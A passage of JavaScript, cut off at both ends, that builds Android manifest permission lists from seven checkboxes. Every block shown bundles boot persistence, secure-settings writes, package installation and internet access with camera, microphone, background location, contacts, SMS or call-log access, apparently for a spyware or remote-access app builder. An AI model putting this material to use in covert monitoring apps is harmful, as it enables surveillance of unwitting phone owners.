            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>           `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
